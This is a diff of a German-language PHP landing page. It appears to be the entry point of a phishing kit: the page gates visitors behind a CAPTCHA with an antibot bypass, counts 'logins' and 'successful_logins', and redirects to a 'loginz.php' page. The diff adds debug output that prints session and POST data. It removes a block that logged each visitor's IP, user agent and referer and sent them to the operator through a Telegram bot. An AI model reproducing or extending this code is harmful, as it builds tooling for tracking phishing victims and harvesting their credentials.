@@ -1,4 +1,5 @@
 <?php
+// Debug version of index.php
 // Only start session if not already started
 if (session_status() == PHP_SESSION_NONE) {
     session_start();
@@ -8,14 +9,26 @@ if (session_status() == PHP_SESSION_NONE) {
 include './config/telegram.php';
 include './captcha.php';
 
+echo "<h2>Debug Information</h2>";
+echo "Session ID: " . session_id() . "<br>";
+echo "Session status: " . session_status() . "<br>";
+echo "POST data: " . print_r($_POST, true) . "<br>";
+echo "Session data: " . print_r($_SESSION, true) . "<br><br>";
+
 // Handle captcha submission
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['captcha_answer'])) {
+    echo "<h3>Processing CAPTCHA submission</h3>";
+    echo "User answer: " . $_POST['captcha_answer'] . "<br>";
+    echo "Session captcha_answer: " . (isset($_SESSION['captcha_answer']) ? $_SESSION['captcha_answer'] : "NOT SET") . "<br>";
+    
     if (verifyCaptcha($_POST['captcha_answer'])) {
+        echo "CAPTCHA verification: SUCCESS<br>";
         $_SESSION['captcha_verified'] = true;
         // Redirect to refresh the page
         header("Location: " . $_SERVER['REQUEST_URI']);
         exit;
     } else {
+        echo "CAPTCHA verification: FAILED<br>";
         // Wrong answer, keep the same captcha question
         $error_message = "Falsche Antwort. Bitte versuchen Sie es erneut.";
     }
@@ -37,6 +50,7 @@ if (!$bypass_antibot) {
 
 // Check if captcha is already verified
 if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== true) {
+    echo "<h3>Showing CAPTCHA form</h3>";
     // Show captcha form
     ?>
     <!DOCTYPE html>
@@ -44,7 +58,7 @@ if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== t
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Bitte bestätigen Sie, dass Sie ein Mensch sind</title>
+        <title>Debug - CAPTCHA Test</title>
         <style>
             body { font-family: Arial, sans-serif; background: white; margin: 0; padding: 20px; }
             .captcha-container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
@@ -54,13 +68,22 @@ if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== t
             .captcha-input { width: 100%; padding: 12px; border: 2px solid #ddd; border-radius: 5px; font-size: 16px; margin-bottom: 20px; box-sizing: border-box; }
             .captcha-button { width: 100%; padding: 12px; background: #007bff; color: white; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; }
             .captcha-button:hover { background: #0056b3; }
+            .debug-info { background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; font-family: monospace; font-size: 12px; }
         </style>
     </head>
     <body>
         <div class="captcha-container">
+            <div class="debug-info">
+                <strong>Debug Info:</strong><br>
+                Session ID: <?php echo session_id(); ?><br>
+                Captcha Question: <?php echo isset($_SESSION['captcha_question']) ? $_SESSION['captcha_question'] : 'NOT SET'; ?><br>
+                Captcha Answer: <?php echo isset($_SESSION['captcha_answer']) ? $_SESSION['captcha_answer'] : 'NOT SET'; ?><br>
+            </div>
+            
             <?php if (isset($error_message)): ?>
                 <div style="color: red; text-align: center; margin-bottom: 15px;"><?php echo $error_message; ?></div>
             <?php endif; ?>
+            
             <div class="captcha-heading">Bitte bestätigen Sie, dass Sie ein Mensch sind</div>
             <div class="captcha-subheading">Um fortzufahren, lösen Sie bitte das Captcha unten:</div>
             <div class="captcha-question"><?php echo getCurrentCaptcha(); ?></div>
@@ -75,48 +98,19 @@ if (!isset($_SESSION['captcha_verified']) || $_SESSION['captcha_verified'] !== t
     exit;
 }
 
+echo "<h3>CAPTCHA verified, proceeding to main page</h3>";
 // Get visitor information
 $ip = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
 $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'CLI/Test';
 $referer = $_SERVER['HTTP_REFERER'] ?? '';
 $time = date('Y-m-d H:i:s');
 
-// Log visitor data
-$log_data = [
-    'timestamp' => $time,
-    'ip' => $ip,
-    'user_agent' => $user_agent,
-    'referer' => $referer
-];
-
-// Save to log file
-$log_file = './logs/visitors.log';
-$log_entry = json_encode($log_data) . "\n";
-file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);
-
-// Update stats
-$stats_file = './app/Panel/stats/stats.ini';
-$stats = @parse_ini_file($stats_file);
-if (!$stats) {
-    $stats = ['visitors' => 0, 'bots' => 0, 'logins' => 0, 'successful_logins' => 0];
-}
-$stats['visitors']++;
-file_put_contents($stats_file, "[stats]\nvisitors = {$stats['visitors']}\nbots = {$stats['bots']}\nlogins = {$stats['logins']}\nsuccessful_logins = {$stats['successful_logins']}\n");
-
-// Telegram Bot 1 - Visitor notification
-if ($enable_telegram) {
-    $message = "🔔 <b>Neuer Besucher auf der Homepage</b>\n\n";
-    $message .= "🌐 <b>IP:</b> $ip\n";
-    $message .= "🕒 <b>Zeit:</b> $time\n";
-    $message .= "🌍 <b>User Agent:</b> $user_agent\n";
-    if ($referer) {
-        $message .= "🔗 <b>Referer:</b> $referer\n";
-    }
-    
-    sendTelegramMessage($telegram_bot1_token, $telegram_bot1_chat_id, $message);
-}
+echo "Visitor IP: $ip<br>";
+echo "User Agent: $user_agent<br>";
+echo "Time: $time<br>";
 
 // Redirect to login page
+echo "<p>Redirecting to login page...</p>";
 header("Location: ./views/loginz.php");
 exit;
 ?>
